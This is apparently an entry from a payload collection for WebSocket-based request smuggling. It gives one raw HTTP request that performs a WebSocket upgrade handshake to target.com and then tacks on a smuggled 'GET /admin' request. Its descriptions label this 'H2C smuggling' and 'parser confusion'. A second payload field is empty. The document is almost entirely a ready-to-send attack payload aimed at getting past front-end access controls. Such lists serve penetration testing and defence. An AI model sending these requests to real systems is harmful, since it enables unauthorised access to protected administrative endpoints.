smuggling.description: WebSocket-based smuggling and protocol abuse payloads

payloads.payload:
GET / HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

GET /admin HTTP/1.1
Host: target.com
payloads.description: H2C smuggling via WebSocket upgrade — smuggle request after handshake

Multiple WS versions — parser confusion

payloads.payload:
